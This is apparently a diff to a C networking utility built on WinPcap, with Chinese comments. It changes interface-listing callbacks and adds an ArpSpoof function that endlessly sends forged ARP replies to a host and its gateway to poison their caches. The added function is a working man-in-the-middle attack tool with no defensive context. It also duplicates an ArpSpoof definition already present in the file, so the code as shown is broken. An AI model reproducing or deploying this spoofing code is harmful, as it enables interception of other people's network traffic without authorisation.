@@ -50,7 +50,7 @@ char* ip6tos(struct sockaddr *sockaddr, char *address, int addrlen)
 }
 
 /* Print all the available information on the given interface */
-int ifprint(pcap_if_t *d)
+int ifprint(pcap_if_t *d, void *para)
 {
 	pcap_addr_t *a;
 	char ip6str[128];
@@ -102,7 +102,7 @@ int ifprint(pcap_if_t *d)
 	return 0;
 }
 
-int ListInterfaceInfomation(IfPrintCallBack callBack)
+int ListInterfaceInfomation(IfPrintCallBack callBack, void * para)
 {
 	int nRet = 0;
 	char errbuf[PCAP_ERRBUF_SIZE];    //错误缓冲区 
@@ -125,7 +125,7 @@ int ListInterfaceInfomation(IfPrintCallBack callBack)
 	d = Devs;
 	while(d)
 	{
-		nRet = callBack(d);
+		nRet = callBack(d, para);
 		if(nRet)
 			break;
 
@@ -141,7 +141,6 @@ int ListInterfaceInfomation(IfPrintCallBack callBack)
 */ 
 unsigned char* GetSelfMac(char* pDevName, unsigned char* mac)
 { 
-#define MAC_LENGTH 6
 	if(NULL == pDevName || NULL == mac)
 	{
 		LOG_ERROR("parametric (pDevName or mac) is set error\n");
@@ -393,6 +392,55 @@ int ArpSpoof(
 
 	return nRet;
 }
+
+
+int ArpSpoof(
+			 char * pszInterfaceName, char * pszGatewayIp, char * pszGatewayMac,
+			 char * pszHostIp, char * pszHostMac, char * pszLocalMac,
+			 int nInterval/*ms*/
+			 )
+{
+	int nRet = 0;
+	struct arp_packet packet;
+	pcap_t * pHandler;
+	char errbuf[PCAP_ERRBUF_SIZE];    //错误缓冲区 
+
+	/* 打开网卡 */ 
+	if((pHandler = pcap_open(pszInterfaceName, // name of the device 
+		65536, // portion of the packet to capture 
+		0, //open flag 
+		1000, // read timeout 
+		NULL, // authentication on the remote machine 
+		errbuf // error buffer 
+		) ) == NULL) 
+	{ 
+		LOG_ERROR("\nUnable to open the adapter. %s is not supported by WinPcap\n",
+			pszInterfaceName); 
+		/* Free the device list */ 
+		return -1; 
+	} 
+
+	//向网关和主机分别定时发送欺骗包
+	while(1)
+	{
+		BuildArpReply(&packet, pszLocalMac, pszHostMac, pszGatewayIp, pszHostIp);
+		if(pcap_sendpacket(pHandler, (const u_char * )&packet, 60) == -1)
+		{
+			fprintf(stderr, "pcap_sendpacket send arp spoof to host error.\n");
+		}
+
+		BuildArpReply(&packet, pszLocalMac, pszGatewayMac, pszHostIp, pszGatewayIp);
+		if(pcap_sendpacket(pHandler, (const u_char * )&packet, 60) == -1)
+		{
+			fprintf(stderr, "pcap_sendpacket send arp spoof to gateway error.\n");
+		}
+		Sleep(nInterval);
+	} // 结束 while(1)
+
+	pcap_close(pHandler); 
+	return nRet;
+}
+
 //
 //int main(int argc,char* argv[]){ 
 //	pcap_if_t *alldevs;               //全部网卡列表 
